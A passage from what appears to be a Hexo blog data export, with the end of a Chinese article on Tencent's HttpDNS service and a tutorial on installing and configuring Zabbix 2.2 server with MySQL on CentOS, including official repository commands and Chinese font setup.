href=\"#2&#x3001;HttpDNS&#x4F18;&#x52BF;&#xFF1A;\" class=\"headerlink\" title=\"2&#x3001;HttpDNS&#x4F18;&#x52BF;&#xFF1A;\"></a>2&#x3001;HttpDNS&#x4F18;&#x52BF;&#xFF1A;</h3><p>&#x4ECE;&#x539F;&#x7406;&#x4E0A;&#x6765;&#x8BB2;&#xFF0C;HttpDNS&#x53EA;&#x662F;&#x5C06;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;&#x534F;&#x8BAE;&#x7531;DNS&#x534F;&#x8BAE;&#x6362;&#x6210;&#x4E86;Http&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E0D;&#x590D;&#x6742;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x4E00;&#x5FAE;&#x5C0F;&#x7684;&#x8F6C;&#x6362;&#xFF0C;&#x5374;&#x5E26;&#x6765;&#x4E86;&#x65E0;&#x6570;&#x7684;&#x6536;&#x76CA;&#xFF1A;</p>\n<p>A&#x3001;&#x6839;&#x6CBB;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;&#x7531;&#x4E8E;&#x7ED5;&#x8FC7;&#x4E86;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#xFF0C;&#x7528;&#x6237;&#x89E3;&#x6790;&#x57DF;&#x540D;&#x7684;&#x8BF7;&#x6C42;&#x901A;&#x8FC7;Http&#x534F;&#x8BAE;&#x76F4;&#x63A5;&#x900F;&#x4F20;&#x5230;&#x4E86;&#x817E;&#x8BAF;&#x7684;HttpDNS&#x670D;&#x52A1;&#x5668;IP&#x4E0A;&#xFF0C;&#x7528;&#x6237;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x5C06;&#x4E0D;&#x4F1A;&#x906D;&#x53D7;&#x5230;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x56F0;&#x6270;&#x3002;</p>\n<p>B&#x3001;&#x8C03;&#x5EA6;&#x7CBE;&#x51C6;&#xFF1A;HttpDNS&#x80FD;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x5230;&#x7528;&#x6237;IP&#xFF0C;&#x901A;&#x8FC7;&#x7ED3;&#x5408;&#x817E;&#x8BAF;&#x81EA;&#x6709;&#x4E13;&#x5229;&#x6280;&#x672F;&#x751F;&#x6210;&#x7684;IP&#x5730;&#x5740;&#x5E93;&#x4EE5;&#x53CA;&#x6D4B;&#x901F;&#x7CFB;&#x7EDF;&#xFF0C;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x5C06;&#x7528;&#x6237;&#x5F15;&#x5BFC;&#x7684;&#x8BBF;&#x95EE;&#x6700;&#x5FEB;&#x7684;IDC&#x8282;&#x70B9;&#x4E0A;&#x3002;</p>\n<p>C&#x3001;&#x5B9E;&#x73B0;&#x6210;&#x672C;&#x4F4E;&#x5EC9;&#xFF1A;&#x63A5;&#x5165;HttpDNS&#x7684;&#x4E1A;&#x52A1;&#x4EC5;&#x9700;&#x8981;&#x5BF9;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x5165;&#x5C42;&#x505A;&#x5C11;&#x91CF;&#x6539;&#x9020;&#xFF0C;&#x65E0;&#x9700;&#x7528;&#x6237;&#x624B;&#x673A;&#x8FDB;&#x884C;root&#x6216;&#x8D8A;&#x72F1;&#xFF1B;&#x800C;&#x4E14;&#x7531;&#x4E8E;Http&#x534F;&#x8BAE;&#x8BF7;&#x6C42;&#x6784;&#x9020;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x517C;&#x5BB9;&#x5404;&#x7248;&#x672C;&#x7684;&#x79FB;&#x52A8;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x66F4;&#x4E0D;&#x6210;&#x95EE;&#x9898;&#xFF1B;&#x53E6;&#x5916;HttpDNS&#x7684;&#x540E;&#x7AEF;&#x914D;&#x7F6E;&#x5B8C;&#x5168;&#x590D;&#x7528;&#x73B0;&#x6709;&#x6743;&#x5A01;DNS&#x914D;&#x7F6E;&#xFF0C;&#x7BA1;&#x7406;&#x6210;&#x672C;&#x4E5F;&#x975E;&#x5E38;&#x4F4E;&#x3002;&#x603B;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;&#x5C31;&#x662F;&#x4EE5;&#x6700;&#x5C0F;&#x7684;&#x6539;&#x9020;&#x6210;&#x672C;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x4E1A;&#x52A1;&#x906D;&#x53D7;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x6EE1;&#x8DB3;&#x4E1A;&#x52A1;&#x7CBE;&#x786E;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x7684;&#x9700;&#x6C42;&#x3002;</p>\n<p>D&#x3001;&#x6269;&#x5C55;&#x6027;&#x5F3A;&#xFF1A;HttpDNS&#x63D0;&#x4F9B;&#x53EF;&#x9760;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x670D;&#x52A1;&#xFF0C;&#x4E1A;&#x52A1;&#x53EF;&#x5C06;&#x81EA;&#x6709;&#x8C03;&#x5EA6;&#x903B;&#x8F91;&#x4E0E;HttpDNS&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7ED3;&#x5408;&#xFF0C;&#x5B9E;&#x73B0;&#x66F4;&#x7CBE;&#x7EC6;&#x5316;&#x7684;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x3002;&#x6BD4;&#x5982;&#x6307;&#x5B9A;&#x7248;&#x672C;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x6307;&#x5B9A;&#x7F51;&#x7EDC;&#x7C7B;&#x578B;&#x7684;&#x7528;&#x6237;&#x8FDE;&#x63A5;&#x6307;&#x5B9A;&#x7684;IP&#x5730;&#x5740;&#x7B49;&#x3002;</p>\n<p>&#x5F53;&#x7136;&#x5404;&#x4F4D;&#x53EF;&#x80FD;&#x4F1A;&#x95EE;&#xFF1A;&#x7528;&#x6237;&#x5C06;&#x9996;&#x9009;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x65B9;&#x5F0F;&#x5207;&#x6362;&#x5230;&#x4E86;HttpDNS&#xFF0C;&#x90A3;&#x4E48;HttpDNS&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x53C8;&#x662F;&#x5982;&#x4F55;&#x4FDD;&#x8BC1;&#x7684;&#x5462;&#xFF1F;&#x53E6;&#x5916;&#x4E0D;&#x540C;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5230;&#x540C;&#x4E00;&#x4E2A;HttpDNS&#x7684;&#x670D;&#x52A1;IP&#xFF0C;&#x7528;&#x6237;&#x7684;&#x8BBF;&#x95EE;&#x5EF6;&#x8FDF;&#x5982;&#x4F55;&#x4FDD;&#x8BC1;&#xFF1F;</p>\n<p>&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x9AD8;&#x53EF;&#x7528;&#x53CA;&#x63D0;&#x5347;&#x7528;&#x6237;&#x4F53;&#x9A8C;&#xFF0C;HttpDNS&#x901A;&#x8FC7;&#x63A5;&#x5165;&#x4E86;&#x817E;&#x8BAF;&#x516C;&#x7F51;&#x4EA4;&#x6362;&#x5E73;&#x53F0;&#x7684;BGP Anycast&#x7F51;&#x7EDC;&#xFF0C;&#x4E0E;&#x5168;&#x56FD;&#x591A;&#x4E2A;&#x4E3B;&#x6D41;&#x8FD0;&#x8425;&#x5546;&#x5EFA;&#x7ACB;&#x4E86;BGP&#x4E92;&#x8054;&#xFF0C;&#x4FDD;&#x8BC1;&#x4E86;&#x8FD9;&#x4E9B;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x7528;&#x6237;&#x80FD;&#x591F;&#x5FEB;&#x901F;&#x5730;&#x8BBF;&#x95EE;&#x5230;HttpDNS&#x670D;&#x52A1;&#xFF1B;&#x53E6;&#x5916;HttpDNS&#x5728;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x8FDB;&#x884C;&#x4E86;&#x90E8;&#x7F72;&#xFF0C;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x53D1;&#x751F;&#x6545;&#x969C;&#x65F6;&#x5747;&#x80FD;&#x65E0;&#x7F1D;&#x5207;&#x6362;&#x5230;&#x5907;&#x4EFD;&#x8282;&#x70B9;&#xFF0C;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x89E3;&#x6790;&#x6B63;&#x5E38;&#x3002;</p>\n<h2 id=\"&#x56DB;&#x3001;&#x63A5;&#x5165;&#x6548;&#x679C;&#x53CA;&#x672A;&#x6765;&#x5C55;&#x671B;&#xFF1A;\"><a href=\"#&#x56DB;&#x3001;&#x63A5;&#x5165;&#x6548;&#x679C;&#x53CA;&#x672A;&#x6765;&#x5C55;&#x671B;&#xFF1A;\" class=\"headerlink\" title=\"&#x56DB;&#x3001;&#x63A5;&#x5165;&#x6548;&#x679C;&#x53CA;&#x672A;&#x6765;&#x5C55;&#x671B;&#xFF1A;\"></a>&#x56DB;&#x3001;&#x63A5;&#x5165;&#x6548;&#x679C;&#x53CA;&#x672A;&#x6765;&#x5C55;&#x671B;&#xFF1A;</h2><p>&#x5F53;&#x524D;HttpDNS&#x5DF2;&#x5728;&#x817E;&#x8BAF;&#x5185;&#x90E8;&#x63A5;&#x5165;&#x4E86;&#x591A;&#x4E2A;&#x4E1A;&#x52A1;&#xFF0C;&#x8986;&#x76D6;&#x6570;&#x4EBF;&#x7528;&#x6237;&#xFF0C;&#x5E76;&#x5DF2;&#x6301;&#x7EED;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x8D85;&#x8FC7;&#x4E00;&#x5E74;&#x65F6;&#x95F4;&#x3002;&#x800C;&#x63A5;&#x5165;&#x4E86;HttpDNS&#x7684;&#x4E1A;&#x52A1;&#x5728;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4F53;&#x9A8C;&#x65B9;&#x9762;&#x90FD;&#x6709;&#x4E86;&#x975E;&#x5E38;&#x5927;&#x7684;&#x63D0;&#x5347;&#x3002;&#x4EE5;&#x67D0;&#x4E2A;&#x63A5;&#x5165;HttpDNS&#x7684;&#x4E1A;&#x52A1;&#x4E3A;&#x4F8B;&#xFF0C;&#x8BE5;&#x4E1A;&#x52A1;&#x4EC5;&#x901A;&#x8FC7;&#x63A5;&#x5165;HttpDNS&#xFF0C;&#x5728;&#x672A;&#x505A;&#x4EFB;&#x4F55;&#x5176;&#x5B83;&#x4F18;&#x5316;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7528;&#x6237;&#x5E73;&#x5747;&#x8BBF;&#x95EE;&#x5EF6;&#x8FDF;&#x4E0B;&#x964D;&#x8D85;&#x8FC7;10%&#xFF0C;&#x8BBF;&#x95EE;&#x5931;&#x8D25;&#x7387;&#x4E0B;&#x964D;&#x4E86;&#x8D85;&#x8FC7;&#x4E94;&#x5206;&#x4E4B;&#x4E00;&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4F53;&#x9A8C;&#x7684;&#x6548;&#x679C;&#x63D0;&#x5347;&#x975E;&#x5E38;&#x663E;&#x8457;&#x3002;&#x53E6;&#x5916;&#x817E;&#x8BAF;&#x7684;HttpDNS&#x670D;&#x52A1;&#x9664;&#x4E86;&#x5728;&#x817E;&#x8BAF;&#x5185;&#x90E8;&#x88AB;&#x5E7F;&#x6CDB;&#x4F7F;&#x7528;&#x4EE5;&#x5916;&#xFF0C;&#x4E5F;&#x53D7;&#x5230;&#x4E86;&#x4E1A;&#x52A1;&#x540C;&#x884C;&#x7684;&#x80AF;&#x5B9A;&#x3002;&#x56FD;&#x5185;&#x6700;&#x5927;&#x7684;publicDNS&#x670D;&#x52A1;&#x5546;114dns&#x5728;&#x53D7;&#x5230;&#x817E;&#x8BAF;DNS&#x7684;&#x542F;&#x53D1;&#x4E0B;&#xFF0C;&#x4E5F;&#x63A8;&#x51FA;&#x4E86;HttpDNS&#x670D;&#x52A1;&#x3002;</p>\n<p>&#x5728;&#x672A;&#x6765;&#x7684;&#x65E5;&#x5B50;&#x91CC;&#xFF0C;&#x817E;&#x8BAF;GSLB&#x56E2;&#x961F;&#x5C06;&#x4F1A;&#x5728;&#x817E;&#x8BAF;&#x5185;&#x90E8;&#x8FDB;&#x4E00;&#x6B65;&#x63A8;&#x5E7F;HttpDNS&#x670D;&#x52A1;&#xFF0C;&#x5E76;&#x5C06;&#x5728;&#x5B9E;&#x9645;&#x4E1A;&#x52A1;&#x7684;&#x9700;&#x6C42;&#x4E0B;&#x5BF9;HttpDNS&#x670D;&#x52A1;&#x8FDB;&#x884C;&#x5347;&#x7EA7;&#xFF0C;&#x5982;&#x63D0;&#x4F9B;&#x66F4;&#x4E3A;&#x901A;&#x7528;&#x3001;&#x5B89;&#x5168;&#x3001;&#x7B80;&#x5355;&#x7684;&#x63A5;&#x5165;&#x534F;&#x8BAE;&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x5347;&#x63A5;&#x5165;&#x7528;&#x6237;&#x7684;&#x7F51;&#x7EDC;&#x8BBF;&#x95EE;&#x4F53;&#x9A8C;&#x7B49;&#x7B49;&#x3002;&#x5E0C;&#x671B;HttpDNS&#x80FD;&#x4E3A;&#x5404;&#x4F4D;&#x5728;&#x89E3;&#x51B3;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x53CA;&#x5168;&#x5C40;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x5931;&#x6548;&#x65B9;&#x9762;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x3001;&#x53EF;&#x884C;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x4E5F;&#x6B22;&#x8FCE;&#x5404;&#x4F4D;&#x4E1A;&#x754C;&#x540C;&#x884C;&#x4E0E;&#x817E;&#x8BAF;&#x4E00;&#x8D77;&#xFF0C;&#x5C31;&#x5982;&#x4F55;&#x8FDB;&#x884C;&#x66F4;&#x7CBE;&#x51C6;&#x7684;&#x5168;&#x5C40;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x65B9;&#x9762;&#x8FDB;&#x884C;&#x66F4;&#x4E3A;&#x6DF1;&#x5165;&#x7684;&#x8BA8;&#x8BBA;&#x3002;</p>\n<p>&#x539F;&#x6587;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://www.zmke.com/i/8705.html\">http://www.zmke.com/i/8705.html</a></p>"},{"title":"zabbix server安装详解","date":"2016-09-23T14:41:19.000Z","toc":false,"_content":"\n## 简介\nzabbix（音同 zæbix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。\nzabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。\n\nzabbix由2部分构成，zabbix server与可选组件zabbix agent。\nzabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。\n\n--- \n## 安装\n\n### Installing repository configuration package\n\nZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5:\n\n```bash\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm\n```\n\nZabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:\n```bash\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm\n```\n\n<!-- more -->\n\nZabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:\n```bash\t\t\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm\n```\n\n### Installing Zabbix packages\n\nInstall Zabbix packages. Example for Zabbix server and web frontend with mysql database.\n\n```bash\nyum install zabbix-server-mysql zabbix-web-mysql\n```\n\nExample for installing Zabbix agent only.\n```bash\nyum install zabbix-agent\n```\n> zabbix-agent需要安装在被监控的机器上，详见另一篇文档《zabbix agent安装详解》\n\n### Creating initial database\nCreate zabbix database and user on MySQL.\n\n```bash\n# mysql -uroot\nmysql> create database zabbix character set utf8 collate utf8_bin;\nmysql> grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';\nmysql> exit\n```\n\nImport initial schema and data.\n```bash\ncd /usr/share/doc/zabbix-server-mysql-2.2.0/create\nmysql -uroot zabbix < schema.sql\nmysql -uroot zabbix < images.sql\nmysql -uroot zabbix < data.sql\n```\n\n### Starting Zabbix server process\nEdit database configuration in zabbix_server.conf\n```bash\n# vi /etc/zabbix/zabbix_server.conf\nDBHost=localhost\nDBName=zabbix\nDBUser=zabbix\nDBPassword=zabbix\n```\n\nStart Zabbix server process.\n```bash\nservice zabbix-server start\n```\n\n### Editing PHP configuration for Zabbix frontend\n\nApache configuration file for Zabbix frontend is located in /etc/httpd/conf.d/zabbix.conf. Some PHP settings are already configured.\n\n```bash\nphp_value max_execution_time 300\nphp_value memory_limit 128M\nphp_value post_max_size 16M\nphp_value upload_max_filesize 2M\nphp_value max_input_time 300\n# php_value date.timezone Europe/Riga\n```\n\nIt's necessary to uncomment the “date.timezone” setting and set the right timezone for you. After changing the configuration file restart the apache web server.\n\n> 如上所述，此处时区配置项需要修改，可改为 php_value date.timezone Asia/Shanghai\n\n```bash\nservice httpd restart\n```\n\nZabbix frontend is available at http://zabbix-frontend-hostname/zabbix in the browser. \nDefault username/password is **Admin/zabbix**.\n\n<br/>\n\n---\n\n## 中文设置及中文乱码\n\n### 中文设置\n【登陆】->【profile】->【User】，language改为chinese[zh_CN].\n\n### 中文乱码\n由于zabbix的web前端默认没有中文字库，因此zabbix图形化显示时下面的中文都是方框。\n解决方法就是拷贝中文字体到zabbix前端。\n\n1.进入c:\\Windows\\Fonts，选择其中任意一种中文字库例如楷体文件simkai.ttf，将其拷贝至zabbix的web 前端页面字体/usr/share/zabbix/fonts 下\n```bash\n[root@iZ94ekimlddZ fonts]# ls\ngraphfont.ttf  simkai.ttf\n```\n\n2.修改zabbix的web前端 defines.inc.php\n```bash\n# vim /usr/share/zabbix/include/defines.inc.php\n\n找到\ndefine('ZBX_FONT_NAME',                       'DejaVuSans');\ndefine('ZBX_GRAPH_FONT_NAME',                 'DejaVuSans'); \n\n这2行修改为\ndefine('ZBX_FONT_NAME',                       'SIMKAI');\ndefine('ZBX_GRAPH_FONT_NAME',                 'SIMKAI'); \n\n保存退出\n```\n\n---\n\n## 其他\n\n**Zabbix官网安装教程(翻墙)：**\nhttps://www.zabbix.com/documentation/2.2/manual/installation/install_from_packages#red_hat_enterprise_linux_centos\n\n**zabbix中文操作手册：**\nhttp://pan.baidu.com/s/1i46GoQh 密码：xw5n (手册中有相关shell脚本下载地址)\n\n![zabbix中文操作手册](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E5%AE%89%E8%A3%85/1.png)\n\n**zabbix_agentd.conf配置文件详解**\nhttp://www.ttlsa.com/zabbix/zabbix_agentd-conf-description/\n\n**zabbix_server.conf配置文件详解**\nhttp://www.ttlsa.com/zabbix/zabbix_server-conf-detail/\n\n**grafana-zabbix插件安装：**\n在grafana插件中心安装grafana-zabbix插件后，需要配置相关数据源：\nhttp://blog.csdn.net/zk673820543/article/details/50617412\n\n**grafana-zabbix使用教程【内含gif图】：**\nhttps://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E5%AE%89%E8%A3%85/2.gif)\n","source":"_posts/zabbix server安装详解.md","raw":"---\ntitle: zabbix server安装详解\ncategories:\n  - 运维部署\ntags:\n  - zabbix\ndate: 2016-9-23 22:41:19\ntoc: false\n---\n\n## 简介\nzabbix（音同 zæbix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。\nzabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。\n\nzabbix由2部分构成，zabbix server与可选组件zabbix agent。\nzabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。\n\n--- \n## 安装\n\n### Installing repository configuration package\n\nZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5:\n\n```bash\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm\n```\n\nZabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:\n```bash\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm\n```\n\n<!-- more -->\n\nZabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:\n```bash\t\t\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm\n```\n\n### Installing Zabbix packages\n\nInstall Zabbix packages. Example for Zabbix server and web frontend with mysql database.\n\n```bash\nyum install zabbix-server-mysql zabbix-web-mysql\n```\n\nExample for installing Zabbix agent only.\n```bash\nyum install zabbix-agent\n```\n> zabbix-agent需要安装在被监控的机器上，详见另一篇文档《zabbix agent安装详解》\n\n### Creating initial database\nCreate zabbix database and user on MySQL.\n\n```bash\n# mysql -uroot\nmysql> create database zabbix character set utf8 collate utf8_bin;\nmysql> grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';\nmysql> exit\n```\n\nImport initial schema and data.\n```bash\ncd /usr/share/doc/zabbix-server-mysql-2.2.0/create\nmysql -uroot zabbix < schema.sql\nmysql -uroot zabbix < images.sql\nmysql -uroot zabbix < data.sql\n```\n\n### Starting Zabbix server process\nEdit database configuration in zabbix_server.conf\n```bash\n# vi /etc/zabbix/zabbix_server.conf\nDBHost=localhost\nDBName=zabbix\nDBUser=zabbix\nDBPassword=zabbix\n```\n\nStart Zabbix server process.\n```bash\nservice zabbix-server start\n```\n\n### Editing PHP configuration for Zabbix frontend\n\nApache configuration file for Zabbix frontend is located in /etc/httpd/conf.d/zabbix.conf. Some PHP settings are already configured.\n\n```bash\nphp_value max_execution_time 300\nphp_value memory_limit 128M\nphp_value post_max_size 16M\nphp_value upload_max_filesize 2M\nphp_value max_input_time 300\n# php_value date.timezone Europe/Riga\n```\n\nIt's necessary to uncomment the “date.timezone” setting and set the right timezone for you. After changing the configuration file restart the apache web server.\n\n> 如上所述，此处时区配置项需要修改，可改为 php_value date.timezone Asia/Shanghai\n\n```bash\nservice httpd restart\n```\n\nZabbix frontend is available at http://zabbix-frontend-hostname/zabbix in the browser. \nDefault username/password is **Admin/zabbix**.\n\n<br/>\n\n---\n\n## 中文设置及中文乱码\n\n### 中文设置\n【登陆】->【profile】->【User】，language改为chinese[zh_CN].\n\n### 中文乱码\n由于zabbix的web前端默认没有中文字库，因此zabbix图形化显示时下面的中文都是方框。\n解决方法就是拷贝中文字体到zabbix前端。\n\n1.进入c:\\Windows\\Fonts，选择其中任意一种中文字库例如楷体文件simkai.ttf，将其拷贝至zabbix的web 前端页面字体/usr/share/zabbix/fonts 下\n```bash\n[root@iZ94ekimlddZ fonts]# ls\ngraphfont.ttf  simkai.ttf\n```\n\n2.修改zabbix的web前端 defines.inc.php\n```bash\n# vim /usr/share/zabbix/include/defines.inc.php\n\n找到\ndefine('ZBX_FONT_NAME',                       'DejaVuSans');\ndefine('ZBX_GRAPH_FONT_NAME',                 'DejaVuSans'); \n\n这2行修改为\ndefine('ZBX_FONT_NAME',                       'SIMKAI');\ndefine('ZBX_GRAPH_FONT_NAME',                 'SIMKAI'); \n\n保存退出\n```\n\n---\n\n## 其他\n\n**Zabbix官网安装教程(翻墙)：**\nhttps://www.zabbix.com/documentation/2.2/manual/installation/install_from_packages#red_hat_enterprise_linux_centos\n\n**zabbix中文操作手册：**\nhttp://pan.baidu.com/s/1i46GoQh 密码：xw5n (手册中有相关shell脚本下载地址)\n\n![zabbix中文操作手册](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E5%AE%89%E8%A3%85/1.png)\n\n**zabbix_agentd.conf配置文件详解**\nhttp://www.ttlsa.com/zabbix/zabbix_agentd-conf-description/\n\n**zabbix_server.conf配置文件详解**\nhttp://www.ttlsa.com/zabbix/zabbix_server-conf-detail/\n\n**grafana-zabbix插件安装：**\n在grafana插件中心安装grafana-zabbix插件后，需要配置相关数据源：\nhttp://blog.csdn.net/zk673820543/article/details/50617412\n\n**grafana-zabbix使用教程【内含gif图】：**\nhttps://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E5%AE%89%E8%A3%85/2.gif)\n","slug":"zabbix server安装详解","published":1,"updated":"2016-11-20T03:19:47.893Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruldv0049gwtmiaeombj8","content":"<h2 id=\"&#x7B80;&#x4ECB;\"><a href=\"#&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"&#x7B80;&#x4ECB;\"></a>&#x7B80;&#x4ECB;</h2><p>zabbix&#xFF08;&#x97F3;&#x540C; z&#xE6;bix&#xFF09;&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;WEB&#x754C;&#x9762;&#x7684;&#x63D0;&#x4F9B;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x76D1;&#x89C6;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x76D1;&#x89C6;&#x529F;&#x80FD;&#x7684;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x5F00;&#x6E90;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x3002;<br>zabbix&#x80FD;&#x76D1;&#x89C6;&#x5404;&#x79CD;&#x7F51;&#x7EDC;&#x53C2;&#x6570;&#xFF0C;&#x4FDD;&#x8BC1;&#x670D;&#x52A1;&#x5668;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x8FD0;&#x8425;&#xFF1B;&#x5E76;&#x63D0;&#x4F9B;&#x7075;&#x6D3B;&#x7684;&#x901A;&#x77E5;&#x673A;&#x5236;&#x4EE5;&#x8BA9;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x5FEB;&#x901F;&#x5B9A;&#x4F4D;/&#x89E3;&#x51B3;&#x5B58;&#x5728;&#x7684;&#x5404;&#x79CD;&#x95EE;&#x9898;&#x3002;</p>\n<p>zabbix&#x7531;2&#x90E8;&#x5206;&#x6784;&#x6210;&#xFF0C;zabbix server&#x4E0E;&#x53EF;&#x9009;&#x7EC4;&#x4EF6;zabbix agent&#x3002;<br>zabbix server&#x53EF;&#x4EE5;&#x901A;&#x8FC7;SNMP&#xFF0C;zabbix agent&#xFF0C;ping&#xFF0C;&#x7AEF;&#x53E3;&#x76D1;&#x89C6;&#x7B49;&#x65B9;&#x6CD5;&#x63D0;&#x4F9B;&#x5BF9;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;/&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x7684;&#x76D1;&#x89C6;&#xFF0C;&#x6570;&#x636E;&#x6536;&#x96C6;&#x7B49;&#x529F;&#x80FD;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x5728;Linux&#xFF0C;Solaris&#xFF0C;HP-UX&#xFF0C;AIX&#xFF0C;Free BSD&#xFF0C;Open BSD&#xFF0C;OS X&#x7B49;&#x5E73;&#x53F0;&#x4E0A;&#x3002;</p>\n<hr>\n<h2 id=\"&#x5B89;&#x88C5;\"><a href=\"#&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;\"></a>&#x5B89;&#x88C5;</h2><h3 id=\"Installing-repository-configuration-package\"><a href=\"#Installing-repository-configuration-package\" class=\"headerlink\" title=\"Installing repository configuration package\"></a>Installing repository configuration package</h3><p>Zabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm</span><br></pre></td></tr></table></figure>\n<p>Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>Zabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm</span><br></pre></td></tr></table></figure></p>\n<h3 